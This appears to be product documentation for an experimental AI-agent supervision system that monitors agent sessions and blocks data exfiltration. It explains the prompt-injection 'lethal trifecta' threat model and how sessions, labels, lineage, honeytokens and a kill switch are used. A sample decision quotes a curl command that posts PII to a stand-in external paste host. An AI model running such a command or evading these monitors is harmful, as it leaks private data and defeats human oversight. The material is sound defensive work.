---
title: "Supervision overview"
---

Supervision joins everything Obot sees an agent do into one session, and decides every action an agent takes with that whole session in view.

:::warning Experimental feature
Supervision is experimental. Its built-in policies start in shadow mode, which records what they would have done without changing any outcome. Enforce a policy only after you have simulated it against your own history.
:::

## The problem it solves

An agent that has read something an outsider could have written, holds data your organization considers private, and can send data somewhere external, can be made to leak that data by instructions hidden in what it read. Each of those three things is harmless on its own, and each is usually visible to a different tool: an endpoint agent sees the shell command, a network proxy sees the request, an identity provider sees the user. None of them sees the chain.

Obot sees every link of the chain, because it sits in five places:

| Surface | What Obot observes |
|---|---|
| `llm` | What enters a model's context through the LLM gateway, and the tool calls the model proposes |
| `mcp` | Tool calls through the MCP gateway and their results |
| `device` | Shell commands, file access and local tool calls reported by Obot Sentry hooks |
| `egress` | HTTP requests leaving a Claude Environments session |
| `copilot` | Actions planned by Microsoft Copilot Studio agents, through its runtime monitoring hook |

Supervision stitches activity from all five into one **session**, labels what enters it, and evaluates one set of **policies** against every outbound action, whichever surface it arrives on.

## Sessions

A session is one agent run: a Claude Code session on a laptop, a conversation through a vMCP, a Claude Environments session, a Copilot Studio conversation. Obot joins activity into a session by, in order:

1. An explicit `X-Obot-Session-ID` header, which Obot returns on LLM gateway responses so clients can propagate it.
2. The agent's own session identifier, scoped by agent: Claude Code's `session_id`, an `Mcp-Session-Id`, the Claude Environment session, the Copilot conversation ID.
3. The actor: the device and agent, the environment, or the user, API key and agent, with a 30-minute idle timeout.

Every session shows which surfaces reported into it. A session seen on only one surface is a blind spot, and the overview counts them, so you know what Supervision could and could not see.

Sessions store **no content**. Tool arguments and results are scanned when they pass through and then discarded. What a session keeps is labels, lineage, counters and short summaries. The surface's own audit logs, which already gate content by role, remain the place to see payloads, and each session event links to its audit record.

## Labels and lineage

**Tools** carry capability labels that say what they can do: `reads-private`, `reads-untrusted`, `writes-external`, `writes-internal`, `exec`, `destructive`, `credential-bearing`. Obot assigns them from the tool's name and description, the Supervisor refines them, and an administrator can override them on the Supervision settings page.

**Content** entering a session carries sensitivity labels found by scanning (`pii`, `secret`, `financial`, `health`, `customer-data`, `source-code`, all of which imply `confidential`) and a trust label. Content from a tool that reads untrusted sources is `untrusted` unless its host is on your trusted-hosts list.

A session's labels are the union of everything that entered it. They are never dropped while the session lasts, so a model that paraphrases what it read cannot launder it.

**Lineage** is the precise complement. Obot fingerprints the structured identifiers (email addresses, phone numbers, card numbers, keys) and the text of confidential content it ingests, and matches outbound actions against them. When the match succeeds, the decision explains itself: "14 pii spans from salesforce.query". Lineage lowers false positives and explains decisions; it never grants permission on its own.

## Decisions

Every outbound action is decided before it happens: a shell command on a laptop, an MCP tool call, a tool call the model proposes, an HTTP request from a sandbox, a Copilot Studio action. The decision carries the policy that made it and a reason written for a person, with the causal chain:

> Lethal trifecta: the session has read untrusted content (github.search_issues) and pii data (salesforce.query). Now: shell: curl -d @- https://paste.example/upload to external destination paste.example. Lineage: 14 pii span(s) from salesforce.query result.

Decisions and the events they decided are visible on the session's replay page and in the decisions feed.

## Interventions

Beyond allow and deny, a policy can:

- **Require approval.** The action is held and a request goes to the approvals inbox with the reason, the session's risk and labels, and the Supervisor's recommendation. Surfaces that can hold a request wait for the answer.
- **Hand the decision to the Supervisor** (`judge`), which decides allow, require approval or deny with the whole session in view.
- **Redact** the sensitive spans it found instead of blocking the whole action.
- **Quarantine** the session so untrusted content is reduced to a constrained summary before it reaches the model again.
- **Downshift** the session's credentials to read-only.

Two interventions apply outside policies:

- **The kill switch** stops an organization, a user, an agent or a session. Every surface denies its next action within seconds.
- **Honeytokens** are canary credentials and records you plant where an agent might read them. If one ever appears in an outbound action, that is definitive exfiltration evidence with no false positives, and the built-in honeytoken policy denies it.

## Warrants

A session can carry a **warrant**: the task the user declared and the capability scopes that task needs, with a time limit. Actions outside the warrant are not blocked automatically; drift is a risk signal and a policy input, and the built-in warrant-drift policy asks the Supervisor whether the action plausibly serves the declared task. A sub-agent's warrant can only be narrower than its parent's, so authority attenuates through delegation.

## Where to look

- **Supervision** (`/supervision`): coverage per surface, decisions by effect, pending approvals, the riskiest sessions, the kill switch and the red-team scorecard.
- **Sessions** (`/sessions`): every session, with a replay timeline and the Supervisor's narrative.
- **Policies** (`/policies`): Obot Policy rules, with simulation and plain-language drafting. See [Policies](./policies.md).
- **Approvals** (`/approvals`): the inbox.

See [The Supervisor](./supervisor.md) for the AI that helps run all of this, and [Surfaces](./surfaces.md) for what each enforcement point needs.
